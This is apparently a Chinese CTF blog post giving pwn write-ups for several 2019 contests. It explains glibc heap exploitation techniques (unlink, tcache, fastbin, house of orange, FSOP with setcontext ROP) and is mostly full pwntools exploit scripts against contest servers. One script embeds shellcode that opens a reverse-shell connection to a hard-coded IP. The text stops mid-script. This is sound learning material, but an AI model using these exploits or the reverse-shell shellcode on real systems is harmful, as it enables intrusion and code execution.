---
title: RoarCTF/巅峰极客挑战赛线上/UNCTF/上海市大学生网络安全大赛/湖湘杯复赛/红帽杯 部分pwn write up
categories: 
- CTF writeup
---

# RoarCTF/巅峰极客挑战赛线上/UNCTF/上海市大学生网络安全大赛/湖湘杯复赛/红帽杯 部分pwn write up

## 前言

最近越来越懒了，想想还是得整理一下最近做过的题

## RoarCTF

### easy_heap

scanf可以触发合并得到ub，一开始以为只能Add16次，后来发现不是的，0的时候if的确进不去，但是仍会-1导致之后可以继续Add，同理free也不限制次数，存在double free和UAF，没有开PIE，改掉0x602090可以Show，通过unlin泄露地址最后覆盖realloc和malloc_hook拿shell 

```py
#coding=utf-8
from pwn import *
import signal
import sys

context.update(arch='amd64',os='linux',log_level='info')
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./pwn')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
if debug:
    p = process('./pwn')
else:
    p = remote('39.97.182.233',31472)

def Init(name,info):
    p.recvuntil("please input your username:")
    p.send(name)
    p.recvuntil("please input your info:")
    p.send(info)

def Add(size,content):
    p.recvuntil('>> ')
    p.sendline('1')
    p.recvuntil("input the size")
    p.sendline(str(size))
    p.recvuntil("please input your content")
    p.send(content)

def Add1(size,content):
    p.sendline('1')
    time.sleep(0.02)
    p.sendline(str(size))
    time.sleep(0.02)
    p.send(content)
    time.sleep(0.02)

def Show():
    p.recvuntil('>> ')
    p.sendline('3')

def Delete():
    p.recvuntil('>> ')
    p.sendline('2')

def Delete1():
    p.sendline('2')
    time.sleep(0.02)

def MagicBuild(content):
    p.recvuntil(">> ")
    p.sendline("666")
    p.recvuntil("build or free?")
    p.sendline("1")
    p.recvuntil("please input your content")
    p.send(content)

def MagicBuild1(content):
    p.sendline('666')
    time.sleep(0.02)
    p.sendline('1')
    time.sleep(0.02)
    p.send(content)
    time.sleep(0.02)

def MagicFree():
    p.recvuntil(">> ")
    p.sendline("666")
    p.recvuntil("build or free?")
    p.sendline("2")

def MagicFree1():
    p.sendline("666")
    time.sleep(0.02)
    p.sendline("2")
    time.sleep(0.02)

def exp():
    #unlink
    m_chk = 0x602088
    c_chk = 0x602098
    fake_chunk = 0x602088-0x18
    name = p64(0)+p64(0x41)+p64(0x602060+0x40)
    info = p64(0x40)+p64(0x41)
    Init(name,info)
    #
    fd = m_chk - 0x18
    bk = m_chk - 0x10
    Add(0x18,p64(0)+p64(0x71))#0
    Add(0x28,'1')#1
    #Delete()
    MagicBuild('m0')
    Add(0x68,'2')#2
    MagicFree()
    Add(0x68,'3')#3
    Add(0x68,'4')#4
    Delete()
    MagicFree()
    Delete()


    #
    Add(0x68,'\x10')#5
    Add(0x68,'6')#6
    Add(0x68,'7')#7

    payload = p64(0)+p64(0x30)+p64(fd)+p64(bk)+p64(0)*2+p64(0x30)+p64(0xb0+0x70)
    Add(0x68,payload)#8
    p.recvuntil(">> ")
    p.sendline("666")

    MagicFree()
    Delete()
    Add(0x30,p64(0)*3+p64(elf.got['free'])+p64(0xDEADBEEFDEADBEEF)+"\x30")#9
    Show()
    libc_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - libc.sym['free']
    log.success("libc base => " + hex(libc_base))

    #get shell

    Add1(0x68,'10')
    Add1(0x68,'11')
    Delete1()
    MagicFree1()
    Delete1()
    Add1(0x68,p64(libc_base+libc.sym['__malloc_hook']-0x23))
    Add1(0x68,'13')
    Add1(0x68,'14')
    realloc = libc_base + libc.sym['realloc']
    one_gadget = libc_base + gadgets[1]
    Add1(0x68,'\x00'*11+p64(one_gadget)+p64(realloc+0x2))
    #4 9 14
    #gdb.attach(p)
    MagicFree1()

    MagicFree1()


    p.interactive()

exp()

'''
def my_exit(signum,frame):
    sys.exit()

while True:
    signal.signal(signal.SIGINT,my_exit)
    try:
        exp()
        p.interactive()
        p.close()
    except:
        p.close()
    if debug:
        p = process('./pwn')
    else:
        p = remote('39.97.182.233',31472)
'''

```

### realloc_magic

和今年的Tokyo Westen比赛的realloc基本一模一样，利用realloc的合并性质，让一个chunk释放7次进入ub，同时它也在tcache里，在它前面搞一个chunk，realloc的时候会把这个ub给合并进去，最终达到overlapping的效果

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='info')
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./pwn')
libc_offset = 0x3ebc40
gadgets = [0x4f2c5,0x4f322,0x10a38c]
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
if debug:
    p = process('./pwn')

else:
    p = remote('39.97.182.233',41251)

def Realloc(size,data):
    p.recvuntil('>> ')
    p.sendline('1')
    p.recvuntil("Size?")
    p.sendline(str(size))
    if size > 0:
        p.recvuntil("Content?")
        p.send(data)

def Delete(chunk_type):
    p.recvuntil('>> ')
    p.sendline('2')

def Magic():
    p.recvuntil('>> ')
    p.sendline('666')

def exp():
    #leak libc
    Realloc(0x100,'a')
    Realloc(0,'')
    #Delete('r')
    Realloc(0xf0,'b')
    Realloc(0,'')
    #Delete('r')
    Realloc(0x110,'c')
    Realloc(0,'')
    #Delete('r')
    Realloc(0xf0,'d')
    for i in range(7):
        Delete('r')
    #

    Realloc(0,'')


    Realloc(0x100,'e')
    if not debug:
        Realloc(0x200,'e'*0x100+p64(0)+p64(0x41)+"\x60\xa7")
    else:
        #Realloc(0x200,'e'*0x100+p64(0)+p64(0x41)+"\x60\x07\xdd")
        Realloc(0x200,'e'*0x100+p64(0)+p64(0x41)+"\x60\xa7")

    Realloc(0,'')

    Realloc(0xf0,'f')
    Realloc(0,'')

    #
    Realloc(0xf0,p64(0xfbad1800)+p64(0)*3+"\x00")

    p.recvn(0x21)
    libc_base = u64(p.recv(8)) - (0x7ffff7dcf780 - 0x7ffff79e4000)
    log.success("libc base => " + hex(libc_base))
    free_hook = libc_base + libc.sym['__free_hook']
    system_addr = libc_base + libc.sym['system']
    #get shell
    Magic()
    #


    Realloc(0x100+0x30,'a')
    Realloc(0,'')
    #Delete('r')
    Realloc(0xf0+0x30,'b')
    Realloc(0,'')
    #Delete('r')
    Realloc(0x110+0x30,'c')
    Realloc(0,'')
    #Delete('r')
    Realloc(0xf0+0x30,'d')
    for i in range(7):
        Delete('r')
    #
    Realloc(0,'')


    Realloc(0x100+0x30,'e')
    Realloc(0x200+0x30+0x30,'a'*0x130+p64(0)+p64(0x51)+p64(free_hook))
    Realloc(0,'')
    Realloc(0x120,'a')
    Realloc(0,'')
    one_gadget = libc_base + gadgets[1]
    Realloc(0x120,p64(one_gadget))

    #Realloc(0x140,"/bin/sh\x00")
    Delete('r')
    #gdb.attach(p)

    #p.interactive()

while True:
    try:
        exp()
        p.interactive()
        p.close()
    except:
        p.close()
    if debug:
        p = process('./pwn')
    else:
        p = remote('39.97.182.233',41251)

```

## 巅峰极客挑战赛

### snoet

house of orange拿到ub，泄露Libc，fastbin attack拿到shell

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./pwn')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
if debug:
    p = process('./pwn')
else:
    p = remote('55fca716.gamectf.com',37009)

def Add(size,content):
    p.recvuntil('Your choice > ')
    p.sendline('1')
    p.recvuntil("Size > ")
    p.sendline(str(size))
    p.recvuntil("Content > \n")
    p.send(content)

def Show():
    p.recvuntil('Your choice > ')
    p.sendline('2')

def Delete():
    p.recvuntil('Your choice > ')
    p.sendline('3')

def Edit(size,content):
    p.recvuntil('Your choice > ')
    p.sendline('4')
    p.recvuntil("Size > ")
    p.sendline(str(size))
    p.recvuntil("Content > \n")
    p.send(content)


def exp():
    #leak libc
    p.recvuntil("What's your name?\n")

    p.send('wz')
    Add(0x48,'0')
    #gdb.attach(p,'b* 0x0000555555554f59')

    Edit(0x50,'0'*0x40+p64(0)+p64(0xfb1))

    Add(0x1000,'a'*8)

    Add(0x60,'a'*8)
    Show()
    p.recvuntil("a"*8)
    libc_base = u64(p.recv(8)) - 88 - libc.sym['__malloc_hook'] - 0x620
    log.success("libc base => " + hex(libc_base))
    fake_chunk = libc_base + libc.sym['__malloc_hook'] - 0x23
    #get shell
    Delete()
    Edit(8,p64(fake_chunk))
    Add(0x60,p64(fake_chunk))
    shell_addr = libc_base + gadgets[2]

    Add(0x60,'\x00'*0x13+p64(shell_addr))
    #gdb.attach(p)

    p.recvuntil('Your choice > ')
    p.sendline('1')
    p.recvuntil("Size > ")
    p.sendline(str(17))

    p.interactive()

exp()
```

### pwn2

这道题是最近做过的最有价值的几道之一了，其中预期解的解法还没有复现，暂时先记下来。

#### 程序逻辑

可以Add 0x10个块，限制Add的chunk地址范围在[heap_base,heap_base+0x600]之间,chunk_list是map出来的随机地址

```c
int Add()
{
  __int64 map_addr; // rbx
  unsigned __int64 idx; // rax
  unsigned __int64 *node; // rbx
  unsigned __int64 size; // rax
  __int64 size1; // rbp
  _BYTE *chunk_addr; // r12

  map_addr = qword_2020B8;
  puts("input your index:");
  idx = read_int();
  if ( idx > 0xF || (node = (unsigned __int64 *)(16 * idx + map_addr), node[1]) )
  {
    puts("out of range or note already exist");
    exit(-1);
  }
  puts("input your size:");
  size = read_int();
  size1 = size;
  if ( size <= 0x7F )
  {
    puts("Invalid size!");
    exit(-1);
  }
  *node = size;
  chunk_addr = malloc(size);
  if ( (unsigned __int64)chunk_addr < qword_2020B0 || (unsigned __int64)chunk_addr > qword_2020B0 + 0x600 )
  {                                             // limit to 0,0x600
    puts("you are bad");
    exit(-1);
  }
  node[1] = (unsigned __int64)chunk_addr;
  puts("input your context:");
  get_input(chunk_addr, size1);
  return puts("add note success!!!");
}
```

Delete里有UAF

```c
int Delete()
{
  __int64 map_addr; // rbx
  unsigned __int64 idx; // rax
  void *chunk_addr; // rdi

  map_addr = qword_2020B8;
  puts("input your index:");
  idx = read_int();
  if ( idx > 0xF || (chunk_addr = *(void **)(map_addr + 16 * idx + 8)) == 0LL )
  {
    puts("out of range or note not exist");
    exit(-1);
  }
  free(chunk_addr);                             // UAF
  return puts("note delete success!!!");
}
```

有输出函数

```c
__int64 Show()
{
  __int64 v0; // rbx
  unsigned __int64 idx; // rax

  v0 = qword_2020B8;
  puts("input your index:");
  idx = read_int();
  if ( idx > 0xF || !*(_QWORD *)(v0 + 16 * idx + 8) )
  {
    puts("out of range or note not exist");
    exit(-1);
  }
  return _printf_chk(1LL, "note[%lu]: %s\n");
}
```

可惜Edit是读取的随机字符

```c
int Change()
{
  __int64 map_addr; // rbx
  unsigned __int64 idx; // rax
  size_t *size_addr; // rax
  void *chunk_addr; // rdi

  map_addr = qword_2020B8;
  puts("input your index:");
  idx = read_int();
  if ( idx > 0xF || (size_addr = (size_t *)(map_addr + 16 * idx), (chunk_addr = (void *)size_addr[1]) == 0LL) )
  {
    puts("out of range or note not exist");
    exit(-1);
  }
  fread(chunk_addr, 1uLL, *size_addr, stream);  // read random
  return puts("Done!");
}
```

#### 漏洞利用

程序有沙箱，不能Get shell，第一种解法是学习n132师傅的做法，先泄露libc和heap，注意随机数的stream放在heap_base里，我们分配到这个地方，即可修改一个FILE结构体，把它的_chain修改到我们伪造的文件结构体，最终使得在exit或者return的时候调用到set_context+53，这个东西是这样的，只要控制rdi存的地址和之后[rdi+0xa8]的内容即可，注意[rdi+0xa8]（被弹到rcx的那个地址）对应的是rip，也就是我们执行完setcontext后执行的地址，而rsp是我们执行完rip之后要执行的值

```asm
0x7ffff7a7a565 <setcontext+53>:      mov    rsp,QWORD PTR [rdi+0xa0]
0x7ffff7a7a56c <setcontext+60>:      mov    rbx,QWORD PTR [rdi+0x80]
0x7ffff7a7a573 <setcontext+67>:      mov    rbp,QWORD PTR [rdi+0x78]
0x7ffff7a7a577 <setcontext+71>:      mov    r12,QWORD PTR [rdi+0x48]
0x7ffff7a7a57b <setcontext+75>:      mov    r13,QWORD PTR [rdi+0x50]
0x7ffff7a7a57f <setcontext+79>:      mov    r14,QWORD PTR [rdi+0x58]
0x7ffff7a7a583 <setcontext+83>:      mov    r15,QWORD PTR [rdi+0x60]
0x7ffff7a7a587 <setcontext+87>:      mov    rcx,QWORD PTR [rdi+0xa8]
0x7ffff7a7a58e <setcontext+94>:      push   rcx
0x7ffff7a7a58f <setcontext+95>:      mov    rsi,QWORD PTR [rdi+0x70]
0x7ffff7a7a593 <setcontext+99>:      mov    rdx,QWORD PTR [rdi+0x88]
0x7ffff7a7a59a <setcontext+106>:     mov    rcx,QWORD PTR [rdi+0x98]
0x7ffff7a7a5a1 <setcontext+113>:     mov    r8,QWORD PTR [rdi+0x28]
0x7ffff7a7a5a5 <setcontext+117>:     mov    r9,QWORD PTR [rdi+0x30]
0x7ffff7a7a5a9 <setcontext+121>:     mov    rdi,QWORD PTR [rdi+0x68]
0x7ffff7a7a5ad <setcontext+125>:     xor    eax,eax
0x7ffff7a7a5af <setcontext+127>:     ret
```

另一种解法（预期解）前面是相似的，分配到随机的那个file里，之后出题人选择把fileno改成0，这样就可以从stdin里edit了，之后参考另一个大佬的博客(https://q1iq.github.io/2019/10/28/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-ichunqiu-wp/)

>1.泄露libc和heap base  
>2. 构造overlap改top的size，利用house_of_force在堆基地址分配块，改stream的内容  
>3. 改stream的fileno为0即stdin，可以正常输入，这样就可以修正top chunk的size，否则后面的malloc函数和free函数都不能使用。  
>4. 改stream的vtable->__xsgetn为fopen，恰当构造“./flag”和“r”字符串，可以在change的时候fopen(“./flag”,”r”)。
>5. 将stream的vtable的内容改回正常的值（只需将vtable->__xsgetn 和 vtable->__read改为正常值即可）
>6. change随便一个块，因为此时stream的fileno为fopen(“./flag”,”r”)得到的文件描述符，所以flag的值会被写入该块，随后show该块即可得到flag

#### exp.py
自己没有实践第二种方法，贴一下第一种解法
```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./pwn3')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    p = process('./pwn3')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('a139cb3d.gamectf.com',15189)
    libc = ELF("./libc.so.6")

def Add(idx,size,content):
    p.recvuntil('Choice:')
    p.sendline('1')
    p.recvuntil("input your index:")
    p.sendline(str(idx))
    p.recvuntil("input your size:")
    p.sendline(str(size))
    p.recvuntil("input your context:")
    p.send(content)

def Show(idx):
    p.recvuntil('Choice:')
    p.sendline('3')
    p.recvuntil("input your index:")
    p.sendline(str(idx))

def Delete(idx):
    p.recvuntil('Choice:')
    p.sendline('2')
    p.recvuntil("input your index:")
    p.sendline(str(idx))

def Edit(size):
    p.recvuntil('Choice:')
    p.sendline('4')
    p.recvuntil("input your index:")
    p.sendline(str(idx))

def Exit():
    p.recvuntil('Choice:')
    p.sendline('5')


def exp():
    #leak libc
    Add(0,0x88,'\n')
    Add(1,0x88,'\n')
    Add(2,0x88,'\n')
    Add(3,0x88,p64(0x21)*0x10+'\n')
    Delete(0)
    Show(0)
    p.recvuntil("note[0]: ")
    libc_base = u64(p.recvline().strip("\n").ljust(8,'\x00')) - 88 - (libc.sym['__malloc_hook']+0x10)
    log.success("libc base => " + hex(libc_base))
    #leak heap
    Delete(2)
    Add(4,0x228,p64(0x221)*40+'\n')#4
    Show(2)
    p.recvuntil("note[2]: ")
    heap_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - 0x230
    log.success("heap base => " + hex(heap_base))
    libc.address = libc_base
    #

    #small bins FIFO
    Add(5,0x88,'\n')#ini 0
    Add(6,0x88,'\n')#ini 2
    #make overlapping chunk
    Delete(1)
    Delete(6)#delete init 0&1
    #got 0x90*2 = 0x120 chunk
    Add(7,0x120-8,'\x00'*0x80+p64(0)+p64(0xa1)+'\x00'*0x50+p64(0)+p64(0x21)+p64(0x21)*4+'\n')

    Delete(7)#free chunk0 & 1
    Delete(6)#free chunk 1
    #use chunk0_1 the chunk 1

    Add(8,0x120-8,'\x00'*0x80+p64(0)+p64(0xa1)+p64(0)+p64(libc_base+0x7ffff7dd37f8-0x7ffff7a0d000-0x10)+'\n')

    #change global max_fast
    Add(9,0x98,'\n')#chunk1 overlap with chunk2
    #recover
    Delete(8)#ini chunk0_1
    #
    Add(10,0x120-8,'\x00'*0x80+p64(0)+p64(0x231)+'\n')

    Delete(6)#ini 1
    Delete(10)#ini chunk0_1
    #fastbin attack
    Add(11,0x120-8,'\x00'*0x80+p64(0)+p64(0x231)+p64(heap_base)+'\n')
    Add(12,0x230-8,'\n')


    # some gadgets
    fio=heap_base+0x80
    rdi=0x0000000000021102+libc_base
    rsi=0x00000000000202e8+libc_base
    rdx=0x0000000000001b92+libc_base
    syscall=0x00000000000bc375+libc_base
    rax=0x0000000000033544+libc_base
    add_rsp_100_ret = 0x8e73e+libc_base
    set_context_addr = 0x47b75+libc_base
    xor_rax_ret = 0x000000000008b8c5+libc_base
    #fake file
    fake = "/bin/sh\x00"+p64(0x61)+p64(libc.sym['system'])+p64(libc.sym['_IO_list_all']-0x10)+p64(0)+p64(1)
    fake = fake.ljust(0x68,'\x00')+p64(heap_base+0x10)+p64(0)
    fake = fake.ljust(0x88,'\x00')+p64(0xff)
    fake = fake.ljust(0xa0,'\x00')+p64(fio+0x8)+p64(add_rsp_100_ret)
    fake = fake.ljust(0xc0,'\x00')+p64(1)
    fake = fake.ljust(0xd8,'\x00')+p64(fio+0xd8-0x10)+p64(set_context_addr)+p64(0xdeadbeed)
    pay = [rax,2,syscall,xor_rax_ret,rdi,4,rsi,heap_base+0x200,syscall,rax,1,rdi,1,syscall]
    rop =flat(pay)
    fake = fake.ljust(0x108,'\x00')+rop
    Add(13,0x230-8,"./flag".ljust(8,'\x00')+'\x00'*0x60+p64(heap_base+0x80)+fake+'\n')

    gdb.attach(p)
    Exit()
    p.interactive()

exp()

```

## UNCTF2019

### orw_heap

这道题是做完巅峰极客开始做的，跟那个非常像，也开了沙箱，只能orw，我的做法和之前的那题很像，最后FSOP劫持到setcontext+53，远程后面读不出来，sc我就改成了反弹shell，最后远程还是没读到flag，迷惑max，第二种解法是Ex师傅博客里的先泄露libc，再用ub踩出size到__free_hook附近，从而可以劫持__free_hook进行SROP最后ROP读flag。[http://blog.eonew.cn/archives/1243]

#### exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='info')
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./pwn')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug == 1:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./pwn')

elif debug == 2:
    libc = ELF("./x64_libc.so.6")
    p = process('./pwn',env={'LD_PRELOAD':'./x64_libc.so.6'})

else:
    libc = ELF('./x64_libc.so.6')
    p = remote('101.71.29.5',10005)

def Add(size,content):
    p.recvuntil('Choice: ')
    p.sendline('1')
    p.recvuntil("Please input size: ")
    p.sendline(str(size))
    p.recvuntil("Please input content: ")
    p.send(content)

def Delete(idx):
    p.recvuntil('Choice: ')
    p.sendline('2')
    p.recvuntil("Please input idx: ")
    p.sendline(str(idx))

def Edit(idx,content):
    p.recvuntil('Choice: ')
    p.sendline('3')
    p.recvuntil("Please input idx: ")
    p.sendline(str(idx))
    p.recvuntil("Please input content: ")
    p.send(content)

def exp():
    #leak libc
    Add(0x88,'\n')#0 0
    Add(0x68,'\n')#1 1
    Add(0x88,'\n')#2 2
    Add(0x2f8,'\n')#3 3
    Add(0x78,'\n')#4 4
    Delete(1)# 5
    Delete(2)# 6
    Delete(0)# 7
    Add(0x88,'a'*0x80+p64(0x190)+'\n')#0 8
    Delete(3)# 9
    #0 1 2 3

    Add(0x88,'\n')#1 10
    #overlap
    Add(0x78,'\n')#2 11
    #if debug:
    #without alsr
    #Edit(2,'\xdd\x25')#12
    Edit(2,'\xdd\x45')#12

    Add(0x78,'\n')#3 13
    Add(0xf8,'\n')#5 14
    #
    Delete(3)# 15
    Delete(1)# 16
    Add(0x78,'a'*0x30+p64(0)+p64(0x21)+'a'*0x30+p64(0x190)+'\n')#1 17

    Delete(5)# 18
    Add(0x2f8,'a'*0x80+p64(0)+p64(0x71)[:-1]+'\n')#3 19

    Add(0x68,'\n')#5 20
    #
    Delete(4)# 21

    Add(0x68,"\x00"*0x33+p64(0xfbad1800)+p64(0)*3+'\xff\n')#4 22


    p.recvn(0x39)
    libc_base = u64(p.recvn(8)) - (0x7f8c1421bb25 - 0x7f8c1408f000)
    log.success("libc base => " + hex(libc_base))
    raw_input()
    #p.recvn(0x1000-0xf-0x8)
    p.recvn(0x1000-0x39-8)
    p.recvn(0x1000)
    p.recvn(0xe00)
    p.recvn(0xc81)
    heap_base = u64(p.recv(8)) - 0x300
    log.success('heap base => ' + hex(heap_base))
    raw_input()

    #

    #gadgets
    # some gadgets
    libc.address = libc_base
    fio=heap_base+0x80
    rdi=0x0000000000021102+libc_base
    rsi=0x00000000000202e8+libc_base
    rdx=0x0000000000001b92+libc_base
    syscall=0x00000000000bc375+libc_base
    rax=0x0000000000033544+libc_base
    add_rsp_100_ret = 0x8e73e+libc_base
    set_context_addr = 0x47b75+libc_base
    xor_rax_ret = 0x000000000008b8c5+libc_base
    #
    #raw_input()
    fio = heap_base+0x90
    Edit(3,'a'*0x80+p64(0)+p64(0xc1)+'\n')#23
    Delete(5)#24
    fake_file = "/bin/sh\x00"+p64(0x61)+p64(0)+p64(libc.sym['_IO_list_all']-0x10)+p64(0)+p64(1)
    fake_file = fake_file.ljust(0x68,'\x00')+p64(heap_base+0x10)+p64(0)
    fake_file = fake_file.ljust(0x88,'\x00')+p64(0xff)
    fake_file =fake_file.ljust(0xa0,'\x00')+p64(fio+0x8)+p64(add_rsp_100_ret)
    fake_file = fake_file.ljust(0xc0,'\x00')+p64(1)+p64(0x21)
    fake_file = fake_file.ljust(0xd8,'\x00')+p64(fio+0xd8-0x10)+p64(set_context_addr)+p64(0xdeadbeef)
    #normal
    #orw = [rax,2,syscall,xor_rax_ret,rdi,4,rsi,heap_base+0x400,syscall,rax,1,rdi,1,syscall,rax,1,rdi,2,syscall,rax,1,rdi,0,syscall,rdi,0,rax,60,syscall]
    #orw = [rax,2,syscall,xor_rax_ret,rdi,4,rsi,heap_base+0x400,syscall,rax,1,rdi,2,syscall,rdi,0,rax,60,syscall]
    #mprotect
    orw = [rax,2,syscall,xor_rax_ret,rdi,4,rsi,heap_base+0x400,syscall,rax,10,rdi,heap_base,rsi,0x4000,rdx,7,syscall]

    rop = flat(orw)
    sc_start = heap_base+0x198+len(rop)
    log.success(str(len(rop)))
    rop += p64(sc_start+8)
    sc = asm('''
            xor rdx,rdx;
            mov rsi,1;
            mov rdi,2;
            mov rax,41;
            syscall;
            mov r12,0xa8726927;
            push r12;
            mov bx,0x3d0d;
            push bx;
            mov bx,0x2;
            push bx;
            mov rsi,rsp;
            mov rdx,0x10;
            mov rdi,rax;
            push rax;
            mov rax,42;
            syscall;
            pop rdi;
            mov rsi,2;
            mov rax,0x21;
            syscall;
            dec rsi;
            mov rax,0x21;
            syscall;
            dec rsi;
            mov rax,0x21;
            syscall;
            mov rdi,1;
            ''')
    sc += asm('mov rsi, '+hex(heap_base+0x400))
    sc += asm('''
            mov rdx,0xff;
            mov rax,1;
            syscall;
            mov rdi,0;
            mov rax,60;
            syscall;
            ''')
    rop += sc
    print "length of rop is "+ str(len(rop))
    fake_file = fake_file.ljust(0x108,'\x00')+rop
    payload = 'flag'
    payload = payload.ljust(8,'\x00')
    payload += '\x00'*0x60+p64(fio)+p64(0)
    payload += p64(heap_base+0x90)+fake_file+'\n'
    Edit(3,payload)# 25
    #gdb.attach(p)
    Add(0x68,'\n')# 26
    p.interactive()

exp()
'''

while True:
    try:
        exp()
        #gdb.attach(p)
        raw_input()
        Add(0x68,'\n')# 26
        p.interactive()
        p.close()
    except:
        p.close()

    if debug:
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        p = process('./pwn')

    else:
        libc = ELF('./x64_libc.so.6')
        p = remote('101.71.29.5',10005)
'''
```

## 上海市大学生网络安全大赛

### boring_heap

劫持到main_arena改top_chunk到malloc_hook附近最后get shell

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./pwn')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug == 1:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./pwn')
elif debug == 2:
    p = process('./pwn',env={'LD_PRELOAD':'./libc.so'})
    libc = ELF("./libc.so")
else:
    libc = ELF('./libc.so')
    p = remote('8sdafgh.gamectf.com',10001)

def Add(size,content):
    p.recvuntil('5.Exit\n')
    p.sendline('1')
    p.recvuntil("Input Size:\n")
    if size == 0x20:
        p.sendline(str(1))
    elif size == 0x30:
        p.sendline('2')
    elif size == 0x40:
        p.sendline('3')
    else:
        print "size not illegal"
    p.recvuntil("Input Content:\n")
    p.sendline(content)

def Update(index,offset,content):
    p.recvuntil('5.Exit\n')
    p.sendline('2')
    p.recvuntil("Which one do you want to update?")
    p.sendline(str(index))
    p.recvuntil("Where you want to update?")
    p.sendline(str(offset))
    p.recvuntil("Input Content:\n")
    p.sendline(content)

def View(index):
    p.recvuntil('5.Exit\n')
    p.sendline('4')
    p.recvuntil("Which one do you want to view?\n")
    p.sendline(str(index))

def Delete(index):
    p.recvuntil('5.Exit\n')
    p.sendline('3')
    p.recvuntil("Which one do you want to delete?\n")
    p.sendline(str(index))

def exp():
    #leak libc
    Add(0x40,'0')#0
    Add(0x30,'1')#1
    Add(0x40,'2')#2
    Add(0x40,'3')#3
    Update(1,0x80000000,'a'*0x10+p64(0)+p64(0x91))

    Delete(1)
    Add(0x30,'4')#4 == 1
    View(2)
    libc_base = u64(p.recvline().strip("\n").ljust(8,'\x00')) - 88 - (libc.sym["__malloc_hook"]+0x10)
    log.success("libc base => " + hex(libc_base))
    main_arena = libc_base + libc.sym['__malloc_hook'] + 0x10
    fake_chunk = main_arena + 0x8 + 0x5
    log.info("main arena => " + hex(main_arena))
    #get shell
    Add(0x40,'5')#5 == 2
    Delete(2)
    Delete(3)
    Delete(5)
    Add(0x20,'6')#6
    Delete(6)
    #malloc to main_arena
    Add(0x40,p64(fake_chunk))#7
    Add(0x40,'8')#8
    Add(0x40,'9')#9
    payload = '\x00'*3+p64(main_arena+0x20)+p64(0x51)
    Add(0x40,payload)#10
    fake_malloc_chunk = libc_base + libc.sym['__malloc_hook'] - 0x18

    Add(0x40,p64(0)*5+p64(fake_malloc_chunk))#11


    shell_addr = libc_base + gadgets[3]
    Add(0x30,'\x00'*8+p64(shell_addr))
    #gdb.attach(p)
    p.recvuntil('5.Exit\n')
    p.sendline('1')
    p.recvuntil("Input Size:\n")
    p.sendline('1')

while True:
    try:
        exp()
        p.interactive()
        p.close()
    except:
        p.close()
    if debug:
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        p = process('./pwn')

    else:
        libc = ELF('./libc.so')
        p = remote('8sdafgh.gamectf.com',10001)

```

### login

Delete里有UAF，构造chunk和Node重叠，释放一个ub，覆盖8+6字节爆破高位，之后是次高位...最终爆破得到libc地址，在修改func指针为one_gadget

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='info')
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./login')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug == 1:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./login')
elif debug == 2:
    p = process('./login',env={'LD_PRELOAD':'./libc.so'})
    libc = ELF("./libc-2.23.so")
else:
    libc = ELF('./libc-2.23.so')
    p = remote('8sdafgh.gamectf.com',20000)

def Register(idx,size,content):
    p.recvuntil('Choice:\n')
    p.sendline('2')
    p.recvuntil("Input the user id:\n")
    p.sendline(str(idx))
    p.recvuntil("Input the password length:\n")
    p.sendline(str(size))
    p.recvuntil("Input password:\n")
    p.send(content)

def Login(idx,size,content):
    p.recvuntil('Choice:\n')
    p.sendline('1')
    p.recvuntil("Input the user id:\n")
    p.sendline(str(idx))
    p.recvuntil("Input the passwords length:\n")
    p.sendline(str(size))
    if size > 0:
        p.recvuntil("Input the password:\n")
        p.send(content)

def Edit(idx,content):
    p.recvuntil('Choice:\n')
    p.sendline('4')
    p.recvuntil("Input the user id:\n")
    p.sendline(str(idx))
    p.recvuntil("Input new pass:\n")
    p.send(content)

def Delete(idx):
    p.recvuntil('Choice:\n')
    p.sendline('3')
    p.recvuntil("Input the user id:\n")
    p.sendline(str(idx))

def exp():
    #leak libc
    Register(0,0x88,'0')#0
    Delete(0)
    Register(1,0x88,'1'*8+'1'*4)

    payload = '\x7f'
    for i in range(0x100):
        Login(1,0x20,'1'*8+'1'*4+p8(i)+payload)
        if "success" in p.recvline():
            payload = p8(i) + payload
            break

    Delete(0)
    Register(2,0x88,'1'*8+'1'*3)
    for i in range(0x100):
        Login(2,0x20,'1'*8+'1'*3+p8(i)+payload)
        if "success" in p.recvline():
            payload = p8(i) + payload
            break
    Delete(0)
    Register(3,0x88,'1'*8+'1'*2)
    for i in range(0x100):
        Login(3,0x20,'1'*8+'1'*2+p8(i)+payload)
        if "success" in p.recvline():
            payload = p8(i) + payload
            break

    Delete(0)
    Register(4,0x88,'1'*8+'1'*1)
    for i in range(0x100):
